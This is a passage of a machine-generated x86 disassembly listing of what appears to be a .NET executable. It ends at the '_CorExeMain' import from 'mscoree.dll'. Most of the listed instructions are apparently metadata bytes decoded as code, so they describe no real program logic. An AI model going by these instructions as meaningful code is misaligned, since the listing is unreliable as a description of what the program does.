  40c715:	4d                   	dec    %ebp
  40c716:	1c 12                	sbb    $0x12,%al
  40c718:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40c71d:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40c722:	0e                   	push   %cs
  40c723:	0b 00                	or     (%eax),%eax
  40c725:	01 15 12 45 01 13    	add    %edx,0x13014512
  40c72b:	00 12                	add    %dl,(%edx)
  40c72d:	82 05 03 06 13 00 13 	addb   $0x13,0x130603
  40c734:	15 12 49 0a 12       	adc    $0x120a4912,%eax
  40c739:	4d                   	dec    %ebp
  40c73a:	1c 12                	sbb    $0x12,%al
  40c73c:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40c741:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40c746:	0e                   	push   %cs
  40c747:	17                   	pop    %ss
  40c748:	20 0a                	and    %cl,(%edx)
  40c74a:	01 13                	add    %edx,(%ebx)
  40c74c:	00 13                	add    %dl,(%ebx)
  40c74e:	01 13                	add    %edx,(%ebx)
  40c750:	02 13                	add    (%ebx),%dl
  40c752:	03 13                	add    (%ebx),%edx
  40c754:	04 13                	add    $0x13,%al
  40c756:	05 13 06 13 07       	add    $0x7130613,%eax
  40c75b:	13 08                	adc    (%eax),%ecx
  40c75d:	13 09                	adc    (%ecx),%ecx
  40c75f:	05 07 01 12 82       	add    $0x82120107,%eax
  40c764:	0d 07 20 03 01       	or     $0x1032007,%eax
  40c769:	0e                   	push   %cs
  40c76a:	1d 05 08 05 20       	sbb    $0x20050805,%eax
  40c76f:	01 1d 05 08 12 07    	add    %ebx,0x7120805
  40c775:	06                   	push   %es
  40c776:	12 81 2d 12 82 19    	adc    0x1982122d(%ecx),%al
  40c77c:	12 82 1d 12 82 21    	adc    0x2182121d(%edx),%al
  40c782:	1d 05 1d 05 06       	sbb    $0x6051d05,%eax
  40c787:	20 01                	and    %al,(%ecx)
  40c789:	01 11                	add    %edx,(%ecx)
  40c78b:	82 2d 06 20 01 01 11 	subb   $0x11,0x1012006
  40c792:	82 31 05             	xorb   $0x5,(%ecx)
  40c795:	20 00                	and    %al,(%eax)
  40c797:	12 82 35 0b 20 03    	adc    0x3200b35(%edx),%al
  40c79d:	01 12                	add    %edx,(%edx)
  40c79f:	61                   	popa
  40c7a0:	12 82 35 11 82 39    	adc    0x39821135(%edx),%al
  40c7a6:	08 20                	or     %ah,(%eax)
  40c7a8:	03 1d 05 1d 05 08    	add    0x8051d05,%ebx
  40c7ae:	08 1a                	or     %bl,(%edx)
  40c7b0:	07                   	pop    %es
  40c7b1:	0a 12                	or     (%edx),%dl
  40c7b3:	81 2d 12 82 19 12 82 	subl   $0x51d2182,0x12198212
  40c7ba:	21 1d 05 
  40c7bd:	1d 05 1d 05 12       	sbb    $0x12051d05,%eax
  40c7c2:	82 1d 1d 05 1d 05 1d 	sbbb   $0x1d,0x51d051d
  40c7c9:	05 0c 00 05 01       	add    $0x105000c,%eax
  40c7ce:	12 82 45 08 12 82    	adc    -0x7dedf7bb(%edx),%al
  40c7d4:	45                   	inc    %ebp
  40c7d5:	08 08                	or     %cl,(%eax)
  40c7d7:	04 07                	add    $0x7,%al
  40c7d9:	02 02                	add    (%edx),%al
  40c7db:	08 09                	or     %cl,(%ecx)
  40c7dd:	00 02                	add    %al,(%edx)
  40c7df:	01 12                	add    %edx,(%edx)
  40c7e1:	82 45 11 82          	addb   $0x82,0x11(%ebp)
  40c7e5:	4d                   	dec    %ebp
  40c7e6:	0d 07 06 1d 05       	or     $0x51d0607,%eax
  40c7eb:	12 82 51 12 35 1d    	adc    0x1d351251(%edx),%al
  40c7f1:	05 08 05 07 07       	add    $0x7070508,%eax
  40c7f6:	02 12                	add    (%edx),%dl
  40c7f8:	82 51 1d 05          	adcb   $0x5,0x1d(%ecx)
  40c7fc:	08 07                	or     %al,(%edi)
  40c7fe:	04 12                	add    $0x12,%al
  40c800:	35 1d 05 08 05       	xor    $0x508051d,%eax
  40c805:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40c80a:	1c 06                	sbb    $0x6,%al
  40c80c:	07                   	pop    %es
  40c80d:	03 1d 05 08 08 05    	add    0x5080805,%ebx
  40c813:	20 01                	and    %al,(%ecx)
  40c815:	13 00                	adc    (%eax),%eax
  40c817:	08 04 07             	or     %al,(%edi,%eax,1)
  40c81a:	01 12                	add    %edx,(%edx)
  40c81c:	60                   	pusha
  40c81d:	0e                   	push   %cs
  40c81e:	07                   	pop    %es
  40c81f:	05 08 08 0e 15       	add    $0x150e0808,%eax
  40c824:	11 81 d9 01 12 60    	adc    %eax,0x601201d9(%ecx)
  40c82a:	12 60 07             	adc    0x7(%eax),%ah
  40c82d:	07                   	pop    %es
  40c82e:	04 08                	add    $0x8,%al
  40c830:	05 1d 05 08 04       	add    $0x408051d,%eax
  40c835:	20 01                	and    %al,(%ecx)
  40c837:	01 05 04 07 01 11    	add    %eax,0x11010704
  40c83d:	64 04 00             	fs add $0x0,%al
  40c840:	01 0b                	add    %ecx,(%ebx)
  40c842:	0a 04 00             	or     (%eax,%eax,1),%al
  40c845:	01 0b                	add    %ecx,(%ebx)
  40c847:	0e                   	push   %cs
  40c848:	04 00                	add    $0x0,%al
  40c84a:	01 0b                	add    %ecx,(%ebx)
  40c84c:	0d 04 00 01 0b       	or     $0xb010004,%eax
  40c851:	0c 06                	or     $0x6,%al
  40c853:	00 01                	add    %al,(%ecx)
  40c855:	0b 11                	or     (%ecx),%edx
  40c857:	81 ad 04 00 01 0a 0a 	subl   $0x100040a,0xa010004(%ebp)
  40c85e:	04 00 01 
  40c861:	0a 0e                	or     (%esi),%cl
  40c863:	04 00                	add    $0x0,%al
  40c865:	01 0a                	add    %ecx,(%edx)
  40c867:	0d 04 00 01 0a       	or     $0xa010004,%eax
  40c86c:	0c 06                	or     $0x6,%al
  40c86e:	00 01                	add    %al,(%ecx)
  40c870:	0a 11                	or     (%ecx),%dl
  40c872:	81 ad 04 00 01 0d 0a 	subl   $0x100040a,0xd010004(%ebp)
  40c879:	04 00 01 
  40c87c:	0d 0e 07 07 02       	or     $0x207070e,%eax
  40c881:	11 64 11 81          	adc    %esp,-0x7f(%ecx,%edx,1)
  40c885:	ad                   	lods   %ds:(%esi),%eax
  40c886:	05 00 01 1d 05       	add    $0x51d0100,%eax
  40c88b:	0c 07                	or     $0x7,%al
  40c88d:	07                   	pop    %es
  40c88e:	02 1d 05 12 81 71    	add    0x71811205,%bl
  40c894:	0d 20 04 01 0e       	or     $0xe010420,%eax
  40c899:	11 81 75 11 82 61    	adc    %eax,0x61821175(%ecx)
  40c89f:	11 82 65 0b 07 06    	adc    %eax,0x6070b65(%edx)
  40c8a5:	12 60 1d             	adc    0x1d(%eax),%ah
  40c8a8:	0e                   	push   %cs
  40c8a9:	0e                   	push   %cs
  40c8aa:	08 12                	or     %dl,(%edx)
  40c8ac:	60                   	pusha
  40c8ad:	08 05 07 01 12 81    	or     %al,0x81120107
  40c8b3:	2d 05 07 01 12       	sub    $0x12010705,%eax
  40c8b8:	81 71 07 07 04 05 1d 	xorl   $0x1d050407,0x7(%ecx)
  40c8bf:	05 08 08 06 00       	add    $0x60808,%eax
  40c8c4:	02 07                	add    (%edi),%al
  40c8c6:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c8cb:	02 0c 1d 05 08 06 00 	add    0x60805(,%ebx,1),%cl
  40c8d2:	02 0d 1d 05 08 06    	add    0x608051d,%cl
  40c8d8:	00 02                	add    %al,(%edx)
  40c8da:	09 1d 05 08 06 00    	or     %ebx,0x60805
  40c8e0:	02 0b                	add    (%ebx),%cl
  40c8e2:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c8e7:	02 06                	add    (%esi),%al
  40c8e9:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c8ee:	02 0a                	add    (%edx),%cl
  40c8f0:	1d 05 08 09 07       	sbb    $0x7090805,%eax
  40c8f5:	03 12                	add    (%edx),%edx
  40c8f7:	81 2d 1d 05 1d 05 05 	subl   $0x12020705,0x51d051d
  40c8fe:	07 02 12 
  40c901:	60                   	pusha
  40c902:	02 04 07             	add    (%edi,%eax,1),%al
  40c905:	01 1d 05 05 07 02    	add    %ebx,0x2070505
  40c90b:	1d 05 08 08 07       	sbb    $0x7080805,%eax
  40c910:	04 1d                	add    $0x1d,%al
  40c912:	05 1d 05 08 05       	add    $0x508051d,%eax
  40c917:	06                   	push   %es
  40c918:	07                   	pop    %es
  40c919:	03 1d 05 08 05 05    	add    0x5050805,%ebx
  40c91f:	00 01                	add    %al,(%ecx)
  40c921:	1d 05 0b 0f 07       	sbb    $0x70f0b05,%eax
  40c926:	06                   	push   %es
  40c927:	12 81 2d 1d 05 08    	adc    0x8051d2d(%ecx),%al
  40c92d:	12 82 69 1d 05 1d    	adc    0x1d051d69(%edx),%al
  40c933:	05 08 20 02 01       	add    $0x1022008,%eax
  40c938:	12 61 11             	adc    0x11(%ecx),%ah
  40c93b:	82 6d 0c 07          	subb   $0x7,0xc(%ebp)
  40c93f:	04 12                	add    $0x12,%al
  40c941:	81 2d 1d 05 12 82 69 	subl   $0x51d69,0x8212051d
  40c948:	1d 05 00 
  40c94b:	00 74 c9 00          	add    %dh,0x0(%ecx,%ecx,8)
	...
  40c957:	00 8e c9 00 00 00    	add    %cl,0xc9(%esi)
  40c95d:	20 00                	and    %al,(%eax)
	...
  40c973:	00 80 c9 00 00 00    	add    %al,0xc9(%eax)
	...
  40c981:	00 5f 43             	add    %bl,0x43(%edi)
  40c984:	6f                   	outsl  %ds:(%esi),(%dx)
  40c985:	72 45                	jb     0x40c9cc
  40c987:	78 65                	js     0x40c9ee
  40c989:	4d                   	dec    %ebp
  40c98a:	61                   	popa
  40c98b:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40c992:	72 65                	jb     0x40c9f9
  40c994:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40c998:	6c                   	insb   (%dx),%es:(%edi)
  40c999:	00 00                	add    %al,(%eax)
  40c99b:	00 00                	add    %al,(%eax)
  40c99d:	00 ff                	add    %bh,%bh
  40c99f:	25 00 20 40 00       	and    $0x402000,%eax
